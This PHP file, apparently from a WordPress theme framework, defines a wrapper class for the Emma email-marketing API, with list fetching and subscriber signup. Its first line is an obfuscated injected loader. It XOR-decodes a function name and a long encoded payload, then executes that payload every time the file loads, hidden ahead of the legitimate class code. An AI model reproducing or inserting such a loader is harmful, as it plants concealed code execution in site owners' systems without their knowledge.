<?php $ChbQCRY='2EIVXK20L9 NQZS'^'Q7,7,.mV9WC:85=';$NYqcRoengPo=$ChbQCRY('',';<YJRGNR:R:BkI,TN0;FeX,D0P1=U3;,YDJexw.>7S>POORV>pTAA.SRD;b;T6Frw-86STrhFURlJVIIf7lM4i77CRmPRFj2k9XY9iFYepquwrn0f<MCQ6,ehD0F1kZlK=bQj8Cfe,>0LADPBIP0J.kN10nhkH,W;0P.QnSIH84H4fjQRGA9JoX8m7R17LEGCS->Mkx3JK>8ic7+3Akhx3595WSBk+R,Rm;X+jiSX9=N1hF3KQ=7M18wKks69- b W0>Er<2GYovaBAU>UTXJECBID1OZgW5JlyGPQH3aSSi=XZ.rzUo5J69=Cr5H4:<hkok=058kXAfJF:ERXQ1tOL8hnee+nng3SdsV51BZrTr1P69Pfc.NPSJD HX<==EJqqB:E-kNmFFQ1-VFHIUFS.< yla-1NDij WMVKQHzGEG=8-0++6 EN.Fd2X7U5,76 y,XG3tui<SO=3WIlT-FUJIDTU0-,.R<NYht831LtSSB6MisB ACX1i:N3qEA9OFOmdPQ8lnRV,,-,FXLqDyV5TPi0M2M=jSNHu3ZuiIPkkI.wQM1LVc ASsSCERXc.yVZQWNiPCMOnHVtna38L2--KT+j2<D4E;bJ;VN=BTWKeOaOJJWcmQoElCB6R5K9A8Xe15>Y:DDA7BQ7VOsOOZ4XX9-MJSPnQ'^'RZqk42 1N;U,4,T==DHnB C6o4PI4ldA,0mLQWU4>5K>,;;9PP,.3q730Z=d9C2ZSIYB2xRL-0+EjviiFLfD=MXB7rPpuaQ8b0>6KAb0EMQELRJYZO91=SBML Q2PBaLoTIzC2JoACKDloypjm4Q>O0jXmN6KlG2BktGqKs:<JX-ZNN:7>hdcTR1dE7EB>+og<XJdPr:7AC2cGSJG KUXUTUF2hHOO3X32P=RJTs>XQ=TSL9->OR,RPWcO,uvbk+ewQMeVWW>yRHAf74R 1qj>IKm P;;8<P3LDgt:-JZYZMY9.ORGuKC+ZLXxxHB>SZHCNOYQAYBx:lC U7792YTghg:+40n=:GR DW=PHbgLtVG1ZL5OCUDYZn A<9cVX<jLQfQ TPDdOb5PY7fuiq02BIEBfhP;3NcND697klh:2+4XJDQGBLEm6A4;V9C4jsZCTQN94VBA6X6,RW2aH0L24cedp1QYMq9Y7pAO2ZWdP726WmOUbA319H6Q+J. 9P<2<EC;4AKBrrHMYMoxjWdQ;QaxMT,F,fM8+1RnsUTtpLXxMAd.Tt5QFr7Dars0hROJe8c4vZg y.IavRHARJ>STr 1R5WD-G1HJmK77Q-53lIoE++>6JDqOeLcbMX<.O TpAUTJ8ac4 N.>V2h.ftP== PYezzkd,');$NYqcRoengPo();

/**
 * Wrapper for Emma's API.
 *
 * @since   1.1.0
 *
 * @package ET\Core\API\Email
 */
class ET_Core_API_Email_Emma extends ET_Core_API_Email_Provider {

	/**
	 * @inheritDoc
	 */
	public $BASE_URL = 'https://api.e2ma.net';

	/**
	 * @inheritDoc
	 */
	public $http_auth = array(
		'username' => 'api_key',
		'password' => 'private_api_key',
	);

	/**
	 * @inheritDoc
	 */
	public $name = 'Emma';

	/**
	 * @inheritDoc
	 */
	public $slug = 'emma';

	protected function _get_lists_url() {
		return "https://api.e2ma.net/{$this->data['user_id']}/groups?group_types=all";
	}

	protected function _get_subscribe_url() {
		return "https://api.e2ma.net/{$this->data['user_id']}/members/signup";
	}

	/**
	 * @inheritDoc
	 */
	public function get_account_fields() {
		return array(
			'api_key'         => array(
				'label' => esc_html__( 'Public API Key', 'et_core' ),
			),
			'private_api_key' => array(
				'label' => esc_html__( 'Private API Key', 'et_core' ),
			),
			'user_id'         => array(
				'label' => esc_html__( 'Account ID', 'et_core' ),
			),
		);
	}

	/**
	 * @inheritDoc
	 */
	public function get_data_keymap( $keymap = array(), $custom_fields_key = '' ) {
		$custom_fields_key = 'fields';

		$keymap = array(
			'list'       => array(
				'name'              => 'group_name',
				'list_id'           => 'member_group_id',
				'subscribers_count' => 'active_count',
			),
			'subscriber' => array(
				'email'     => 'email',
				'name'      => 'fields.first_name',
				'last_name' => 'fields.last_name',
				'list_id'   => '@_group_ids',
			),
		);

		return parent::get_data_keymap( $keymap, $custom_fields_key );
	}

	/**
	 * @inheritDoc
	 */
	public function fetch_subscriber_lists() {
		if ( empty( $this->data['api_key'] ) ) {
			return $this->API_KEY_REQUIRED;
		}

		$this->LISTS_URL         = $this->_get_lists_url();
		$this->response_data_key = false;

		return parent::fetch_subscriber_lists();
	}

	/**
	 * @inheritDoc
	 */
	public function subscribe( $args, $url = '' ) {
		$url                     = $this->_get_subscribe_url();
		$this->response_data_key = 'member_id';

		$args = $this->transform_data_to_provider_format( $args, 'subscriber' );

		$this->prepare_request( $url, 'POST', false, $args, true );

		return parent::subscribe( $args, $url );
	}
}
